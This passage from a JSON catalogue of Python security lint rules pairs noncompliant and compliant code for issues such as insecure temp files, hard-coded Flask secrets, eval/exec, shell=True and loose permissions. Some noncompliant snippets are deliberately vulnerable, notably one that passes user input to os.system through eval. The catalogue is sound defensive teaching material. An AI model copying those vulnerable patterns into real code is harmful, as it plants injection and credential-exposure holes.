descriptor is not inherited by child processes </li>\n      <li> The file will be destroyed as soon as it is closed </li>\n    </ul>  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nfile = open(\"/tmp/temporary_file\",\"w+\") # Sensitive\n</pre>\n<pre>\ntmp_dir = os.environ.get('TMPDIR') # Sensitive\nfile = open(tmp_dir+\"/temporary_file\",\"w+\")\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport tempfile\n\nfile = tempfile.TemporaryFile(dir=\"/tmp/my_subdirectory\", mode='\"w+\") # Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/377\">CWE-377 - Insecure Temporary File</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/379\">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>\n  </li>\n  <li> <a href=\"https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File\">OWASP, Insecure Temporary File</a> </li>\n  <li> <a href=\"https://docs.python.org/3/library/tempfile.html\">Python tempfile module</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S5445": {
        "name": "Insecure temporary file creation methods should not be used",
        "htmlDesc": "<p>Temporary files are considered insecurely created when the file existence check is performed separately from the actual file creation. Such a\nsituation can occur when creating temporary files using normal file handling functions or when using dedicated temporary file handling functions that\nare not atomic.</p>\n<h2>Why is this an issue?</h2>\n<p>Creating temporary files in a non-atomic way introduces race condition issues in the application’s behavior. Indeed, a third party can create a\ngiven file between when the application chooses its name and when it creates it.</p>\n<p>In such a situation, the application might use a temporary file that it does not entirely control. In particular, this file’s permissions might be\ndifferent than expected. This can lead to trust boundary issues.</p>\n<h3>What is the potential impact?</h3>\n<p>Attackers with control over a temporary file used by a vulnerable application will be able to modify it in a way that will affect the application’s\nlogic. By changing this file’s Access Control List or other operating system-level properties, they could prevent the file from being deleted or\nemptied. They may also alter the file’s content before or while the application uses it.</p>\n<p>Depending on why and how the affected temporary files are used, the exploitation of a race condition in an application can have various\nconsequences. They can range from sensitive information disclosure to more serious application or hosting infrastructure compromise.</p>\n<h4>Information disclosure</h4>\n<p>Because attackers can control the permissions set on temporary files and prevent their removal, they can read what the application stores in them.\nThis might be especially critical if this information is sensitive.</p>\n<p>For example, an application might use temporary files to store users' session-related information. In such a case, attackers controlling those\nfiles can access session-stored information. This might allow them to take over authenticated users' identities and entitlements.</p>\n<h4>Attack surface extension</h4>\n<p>An application might use temporary files to store technical data for further reuse or as a communication channel between multiple components. In\nthat case, it might consider those files part of the trust boundaries and use their content without additional security validation or sanitation. In\nsuch a case, an attacker controlling the file content might use it as an attack vector for further compromise.</p>\n<p>For example, an application might store serialized data in temporary files for later use. In such a case, attackers controlling those files'\ncontent can change it in a way that will lead to an insecure deserialization exploitation. It might allow them to execute arbitrary code on the\napplication hosting server and take it over.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<p>The following code example is vulnerable to a race condition attack because it creates a temporary file using an unsafe API function.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport tempfile\n\nfilename = tempfile.mktemp() # Noncompliant\ntmp_file = open(filename, \"w+\")\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport tempfile\n\ntmp_file1 = tempfile.NamedTemporaryFile(delete=False)\ntmp_file2 = tempfile.NamedTemporaryFile()\n</pre>\n<h3>How does this work?</h3>\n<p>Applications should create temporary files so that no third party can read or modify their content. It requires that the files' name, location, and\npermissions are carefully chosen and set. This can be achieved in multiple ways depending on the applications' technology stacks.</p>\n<h4>Use a secure API function</h4>\n<p>Temporary files handling APIs generally provide secure functions to create temporary files. In most cases, they operate in an atomical way,\ncreating and opening a file with a unique and unpredictable name in a single call. Those functions can often be used to replace less secure\nalternatives without requiring important development efforts.</p>\n<p>Here, the example compliant code uses the more secure <code>tempfile.NamedTemporaryFile</code> function to handle the temporary file creation.</p>\n<h4>Strong security controls</h4>\n<p>Temporary files can be created using unsafe functions and API as long as strong security controls are applied. Non-temporary file-handling\nfunctions and APIs can also be used for that purpose.</p>\n<p>In general, applications should ensure that attackers can not create a file before them. This turns into the following requirements when creating\nthe files:</p>\n<ul>\n  <li> Files should be created in a non-public directory. </li>\n  <li> File names should be unique. </li>\n  <li> File names should be unpredictable. They should be generated using a cryptographically secure random generator. </li>\n  <li> File creation should fail if a target file already exists. </li>\n</ul>\n<p>Moreover, when possible, it is recommended that applications destroy temporary files after they have finished using them.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File\">OWASP</a> - Insecure Temporary File </li>\n  <li> <a href=\"https://docs.python.org/3/library/tempfile.html#deprecated-functions-and-variables\">Python documentation</a> - tempfile </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/377\">CWE-377 - Insecure Temporary File</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/379\">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>\n  </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S6779": {
        "name": "Flask secret keys should not be disclosed",
        "htmlDesc": "<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source\ncode is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get\nexposed to an unintended audience.</p>\n<h2>Why is this an issue?</h2>\n<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.\nUnintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated\nservices or resources.</p>\n<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>\n<h3>What is the potential impact?</h3>\n<p>If a Flask secret key leaks to an unintended audience, it can have serious security implications for the corresponding application. The secret key\nis used to sign cookies and other sensitive data so that an attacker could potentially use it to perform malicious actions.</p>\n<p>For example, an attacker could use the secret key to create their own cookies that appear to be legitimate, allowing them to bypass authentication\nand gain access to sensitive data or functionality.</p>\n<p>In the worst-case scenario, an attacker could be able to execute arbitrary code on the application and take over its hosting server.</p>\n<h2>How to fix it</h2>\n<p><strong>Revoke the secret</strong></p>\n<p>Revoke any leaked secrets and remove them from the application source code.</p>\n<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the\nsecret is revoked.</p>\n<p>In Flask, changing the secret value is sufficient to invalidate any data that it protected.</p>\n<p><strong>Use a secret vault</strong></p>\n<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected\ndisclosure.</p>\n<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom flask import Flask\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = \"secret\"  # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom flask import Flask\nimport os\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = os.environ[\"SECRET_KEY\"]\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n</ul>\n<h3>Documentation</h3>\n<ul>\n  <li> Flask documentation - <a href=\"https://flask.palletsprojects.com/en/2.3.x/config/#SECRET_KEY\">Config - SECRET_KEY</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "python:S1523": {
        "name": "Dynamically executing code is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807\">CVE-2017-9807</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802\">CVE-2017-9802</a> </li>\n</ul>\n<p>Some APIs enable the execution of dynamic code by providing it as strings at runtime. These APIs might be useful in some very specific\nmeta-programming use-cases. However most of the time their use is frowned upon because they also increase the risk of maliciously <a\nhref=\"https://owasp.org/www-community/attacks/Code_Injection\">Injected Code</a>. Such attacks can either run on the server or in the client (example:\nXSS attack) and have a huge impact on an application’s security.</p>\n<p>This rule marks for review each occurrence of such dynamic code execution. This rule does not detect code injections. It only highlights the use of\nAPIs which should be used sparingly and very carefully.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the executed code may come from an untrusted source and hasn’t been sanitized. </li>\n  <li> you really need to run code dynamically. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the\ncode in a <a href=\"https://en.wikipedia.org/wiki/Sandbox_(computer_security)\">sandboxed</a> environment. Use jails, firewalls and whatever means your\noperating system and programming language provide (example: <a\nhref=\"https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager\">Security Managers</a> in java, <a\nhref=\"https://www.w3schools.com/tags/att_iframe_sandbox.asp\">iframes</a> and <a href=\"https://en.wikipedia.org/wiki/Same-origin_policy\">same-origin\npolicy</a> for javascript in a web browser).</p>\n<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>\n<p>Avoid using dynamic code APIs whenever possible. Hard-coded code is always safer.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport os\n\nvalue = input()\ncommand = 'os.system(\"%s\")' % value\n\ndef evaluate(command, file, mode):\n    eval(command)  # Sensitive.\n\neval(command)  # Sensitive. Dynamic code\n\ndef execute(code, file, mode):\n    exec(code)  # Sensitive.\n    exec(compile(code, file, mode))  # Sensitive.\n\nexec(command)  # Sensitive.\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/95\">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval\n  Injection')</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S2612": {
        "name": "Setting loose POSIX file permissions is security-sensitive",
        "htmlDesc": "<p>In Unix file system permissions, the \"<code>others</code>\" category refers to all users except the owner of the file system resource and the\nmembers of the group assigned to this resource.</p>\n<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive\ninformation, disrupt services or elevate privileges.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application is designed to be run on a multi-user environment. </li>\n  <li> Corresponding files and directories may contain confidential information. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>The most restrictive possible permissions should be assigned to files and directories.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.python.org/3/library/os.html#os.umask\">os.umask</a>:</p>\n<pre>\nos.umask(0)  # Sensitive\n</pre>\n<p>For <a href=\"https://docs.python.org/3/library/os.html#os.chmod\">os.chmod</a>, <a\nhref=\"https://docs.python.org/3/library/os.html#os.lchmod\">os.lchmod</a>, and <a\nhref=\"https://docs.python.org/3/library/os.html#os.fchmod\">os.fchmod</a>:</p>\n<pre>\nos.chmod(\"/tmp/fs\", stat.S_IRWXO)   # Sensitive\nos.lchmod(\"/tmp/fs\", stat.S_IRWXO)  # Sensitive\nos.fchmod(fd, stat.S_IRWXO)         # Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.python.org/3/library/os.html#os.umask\">os.umask</a>:</p>\n<pre>\nos.umask(0o777)\n</pre>\n<p>For <a href=\"https://docs.python.org/3/library/os.html#os.chmod\">os.chmod</a>, <a\nhref=\"https://docs.python.org/3/library/os.html#os.lchmod\">os.lchmod</a>, and <a\nhref=\"https://docs.python.org/3/library/os.html#os.fchmod\">os.fchmod</a>:</p>\n<pre>\nos.chmod(\"/tmp/fs\", stat.S_IRWXU)\nos.lchmod(\"/tmp/fs\", stat.S_IRWXU)\nos.fchmod(fd, stat.S_IRWXU)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> <a\n  href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission\">OWASP File Permission</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "python:S2053": {
        "name": "Password hashing functions should use an unpredictable salt",
        "htmlDesc": "<p>This vulnerability increases the likelihood that attackers are able to compute the cleartext of password hashes.</p>\n<h2>Why is this an issue?</h2>\n<p>During the process of password hashing, an additional component, known as a \"salt,\" is often integrated to bolster the overall security. This salt,\nacting as a defensive measure, primarily wards off certain types of attacks that leverage pre-computed tables to crack passwords.</p>\n<p>However, potential risks emerge when the salt is deemed insecure. This can occur when the salt is consistently the same across all users or when it\nis too short or predictable. In scenarios where users share the same password and salt, their password hashes will inevitably mirror each other.\nSimilarly, a short salt heightens the probability of multiple users unintentionally having identical salts, which can potentially lead to identical\npassword hashes. These identical hashes streamline the process for potential attackers to recover clear-text passwords. Thus, the emphasis on\nimplementing secure, unique, and sufficiently lengthy salts in password-hashing functions is vital.</p>\n<h3>What is the potential impact?</h3>\n<p>Despite best efforts, even well-guarded systems might have vulnerabilities that could allow an attacker to gain access to the hashed passwords.\nThis could be due to software vulnerabilities, insider threats, or even successful phishing attempts that give attackers the access they need.</p>\n<p>Once the attacker has these hashes, they will likely attempt to crack them using a couple of methods. One is brute force, which entails trying\nevery possible combination until the correct password is found. While this can be time-consuming, having the same salt for all users or a short salt\ncan make the task significantly easier and faster.</p>\n<p>If multiple users have the same password and the same salt, their password hashes would be identical. This means that if an attacker successfully\ncracks one hash, they have effectively cracked all identical ones, granting them access to multiple accounts at once.</p>\n<p>A short salt, while less critical than a shared one, still increases the odds of different users having the same salt. This might create clusters\nof password hashes with identical salt that can then be attacked as explained before.</p>\n<p>With short salts, the probability of a collision between two users' passwords and salts couple might be low depending on the salt size. The shorter\nthe salt, the higher the collision probability. In any case, using longer, cryptographically secure salt should be preferred.</p>\n<h3>Exceptions</h3>\n<p>To securely store password hashes, it is a recommended to rely on key derivation functions that are computationally intensive. Examples of such\nfunctions are:</p>\n<ul>\n  <li> Argon2 </li>\n  <li> PBKDF2 </li>\n  <li> Scrypt </li>\n  <li> Bcrypt </li>\n</ul>\n<p>When they are used for password storage, using a secure, random salt is required.</p>\n<p>However, those functions can also be used for other purposes such as master key derivation or password-based pre-shared key generation. In those\ncases, the implemented cryptographic protocol might require using a fixed salt to derive keys in a deterministic way. In such cases, using a fixed\nsalt is safe and accepted.</p>\n<h2>How to fix it in Python Standard Library</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of hard-coded salts.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport hashlib\n\nhash = hashlib.scrypt(password, salt=b\"F3MdWpeHeeSjlUxvKBnzzA\", n=2**17, r=8, p=1) # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport hashlib\nimport secrets\n\nsalt = secrets.token_bytes(32)\nhash = hashlib.scrypt(password, salt=salt, n=2**17, r=8, p=1)\n</pre>\n<h3>How does this work?</h3>\n<p>This code ensures that each user’s password has a unique salt value associated with it. It generates a salt randomly and with a length that\nprovides the required security level. It uses a salt length of at least 32 bytes (256 bits), as recommended by industry standards.</p>\n<p>Here, the compliant code example ensures the salt is random and has a sufficient length by calling the <code>secrets.token_bytes</code> function.\nThis one internally uses a cryptographically secure pseudo random number generator.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/759\">CWE-759 - Use of a One-Way Hash without a Salt</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/760\">CWE-760 - Use of a One-Way Hash with a Predictable Salt</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S3752": {
        "name": "Allowing both safe and unsafe HTTP methods is security-sensitive",
        "htmlDesc": "<p>An HTTP method is safe when used to perform a read-only operation, such as retrieving information. In contrast, an unsafe HTTP method is used to\nchange the state of an application, for instance to update a user’s profile on a web application.</p>\n<p>Common safe HTTP methods are GET, HEAD, or OPTIONS.</p>\n<p>Common unsafe HTTP methods are POST, PUT and DELETE.</p>\n<p>Allowing both safe and unsafe HTTP methods to perform a specific operation on a web application could impact its security, for example CSRF\nprotections are most of the time only protecting operations performed by unsafe HTTP methods.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> HTTP methods are not defined at all for a route/controller of the application. </li>\n  <li> Safe HTTP methods are defined and used for a route/controller that can change the state of an application. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>For all the routes/controllers of an application, the authorized HTTP methods should be explicitly defined and safe HTTP methods should only be\nused to perform read-only operations.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://www.djangoproject.com/\">Django</a>:</p>\n<pre>\n# No method restriction\ndef view(request):  # Sensitive\n    return HttpResponse(\"...\")\n</pre>\n<pre>\n@require_http_methods([\"GET\", \"POST\"])  # Sensitive\ndef view(request):\n    return HttpResponse(\"...\")\n</pre>\n<p>For <a href=\"https://flask.palletsprojects.com/en/1.1.x/\">Flask</a>:</p>\n<pre>\n@methods.route('/sensitive', methods=['GET', 'POST'])  # Sensitive\ndef view():\n    return Response(\"...\", 200)\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://www.djangoproject.com/\">Django</a>:</p>\n<pre>\n@require_http_methods([\"POST\"])\ndef view(request):\n    return HttpResponse(\"...\")\n</pre>\n<pre>\n@require_POST\ndef view(request):\n    return HttpResponse(\"...\")\n</pre>\n<pre>\n@require_GET\ndef view(request):\n    return HttpResponse(\"...\")\n</pre>\n<pre>\n@require_safe\ndef view(request):\n    return HttpResponse(\"...\")\n</pre>\n<p>For <a href=\"https://flask.palletsprojects.com/en/1.1.x/\">Flask</a>:</p>\n<pre>\n@methods.route('/compliant1')\ndef view():\n    return Response(\"...\", 200)\n</pre>\n<pre>\n@methods.route('/compliant2', methods=['GET'])\ndef view():\n    return Response(\"...\", 200)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/352\">CWE-352 - Cross-Site Request Forgery (CSRF)</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/csrf\">OWASP: Cross-Site Request Forgery</a> </li>\n  <li> <a href=\"https://docs.djangoproject.com/en/3.1/topics/http/decorators/#allowed-http-methods\">Django</a> - Allowed HTTP Methods </li>\n  <li> <a href=\"https://flask.palletsprojects.com/en/1.1.x/quickstart/#http-methods\">Flask</a> - HTTP Methods </li>\n</ul>",
        "severity": "MINOR"
      },
      "python:S4721": {
        "name": "Using shell interpreter when executing OS commands is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Arbitrary OS command injection vulnerabilities are more likely when a shell is spawned rather than a new process, indeed shell meta-chars can be\nused (when parameters are user-controlled for instance) to inject OS commands.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> OS command name or parameters are user-controlled. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Use functions that don’t spawn a shell.</p>\n<h2>Sensitive Code Example</h2>\n<p>Python 3</p>\n<pre>\nsubprocess.run(cmd, shell=True)  # Sensitive\nsubprocess.Popen(cmd, shell=True)  # Sensitive\nsubprocess.call(cmd, shell=True)  # Sensitive\nsubprocess.check_call(cmd, shell=True)  # Sensitive\nsubprocess.check_output(cmd, shell=True)  # Sensitive\nos.system(cmd)  # Sensitive: a shell is always spawn\n</pre>\n<p>Python 2</p>\n<pre>\ncmd = \"when a string is passed through these function, a shell is spawn\"\n(_, child_stdout, _) = os.popen2(cmd)  # Sensitive\n(_, child_stdout, _) = os.popen3(cmd)  # Sensitive\n(_, child_stdout) = os.popen4(cmd)  # Sensitive\n\n\n(child_stdout, _) = popen2.popen2(cmd)  # Sensitive\n(child_stdout, _, _) = popen2.popen3(cmd)  # Sensitive\n(child_stdout, _) = popen2.popen4(cmd)  # Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Python 3</p>\n<pre>\n# by default shell=False, a shell is not spawn\nsubprocess.run(cmd)  # Compliant\nsubprocess.Popen(cmd)  # Compliant\nsubprocess.call(cmd)  # Compliant\nsubprocess.check_call(cmd)  # Compliant\nsubprocess.check_output(cmd)  # Compliant\n\n# always in a subprocess:\nos.spawnl(mode, path, *cmd)  # Compliant\nos.spawnle(mode, path, *cmd, env)  # Compliant\nos.spawnlp(mode, file, *cmd)  # Compliant\nos.spawnlpe(mode, file, *cmd, env)  # Compliant\nos.spawnv(mode, path, cmd)  # Compliant\nos.spawnve(mode, path, cmd, env)  # Compliant\nos.spawnvp(mode, file, cmd)  # Compliant\nos.spawnvpe(mode, file, cmd, env)  # Compliant\n\n(child_stdout) = os.popen(cmd, mode, 1)  # Compliant\n(_, output) = subprocess.getstatusoutput(cmd)  # Compliant\nout = subprocess.getoutput(cmd)  # Compliant\nos.startfile(path)  # Compliant\nos.execl(path, *cmd)  # Compliant\nos.execle(path, *cmd, env)  # Compliant\nos.execlp(file, *cmd)  # Compliant\nos.execlpe(file, *cmd, env)  # Compliant\nos.execv(path, cmd)  # Compliant\nos.execve(path, cmd, env)  # Compliant\nos.execvp(file, cmd)  # Compliant\nos.execvpe(file, cmd, env)  # Compliant\n</pre>\n<p>Python 2</p>\n<pre>\ncmdsargs = (\"use\", \"a\", \"sequence\", \"to\", \"directly\", \"start\", \"a\", \"subprocess\")\n\n(_, child_stdout) = os.popen2(cmdsargs)  # Compliant\n(_, child_stdout, _) = os.popen3(cmdsargs)  # Compliant\n(_, child_stdout) = os.popen4(cmdsargs)  # Compliant\n\n(child_stdout, _) = popen2.popen2(cmdsargs)  # Compliant\n(child_stdout, _, _) = popen2.popen3(cmdsargs)  # Compliant\n(child_stdout, _) = popen2.popen4(cmdsargs)  # Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/78\">CWE-78 - Improper Neutralization of Special Elements used in an OS Command</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "python:S6463": {
        "name": "Allowing unrestricted outbound communications is security-sensitive",
        "htmlDesc": "<p>Allowing unrestricted outbound communications can lead to data leaks.</p>\n<p>A restrictive security group is an additional layer of protection that might prevent the abuse or exploitation of a resource. For example, it\ncomplicates the exfiltration of data in the case of a successfully exploited vulnerability.</p>\n<p>When deciding if outgoing connections should be limited, consider that limiting the connections results in additional administration and\nmaintenance work.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The resource has access to sensitive data. </li>\n  <li> The resource is part of a private network. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to restrict outgoing connections to a set of trusted destinations.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.SecurityGroup.html\">aws_cdk.aws_ec2.SecurityGroup</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_ec2 as ec2\n)\n\nec2.SecurityGroup(  # Sensitive; allow_all_outbound is enabled by default\n    self,\n    \"example\",\n    vpc=vpc\n)\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.SecurityGroup.html\">aws_cdk.aws_ec2.SecurityGroup</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_ec2 as ec2\n)\n\nsg = ec2.SecurityGroup(\n    self,\n    \"example\",\n    vpc=vpc,\n    allow_all_outbound=False\n)\n\nsg.add_egress_rule(\n    peer=ec2.Peer.ipv4(\"203.0.113.127/32\"),\n    connection=ec2.Port.tcp(443)\n)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html\">AWS Documentation</a> - Control traffic to resources using\n  security groups </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "python:S1313": {
        "name": "Using hardcoded IP addresses is security-sensitive",
        "htmlDesc": "<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attack’s impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> It’s a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without 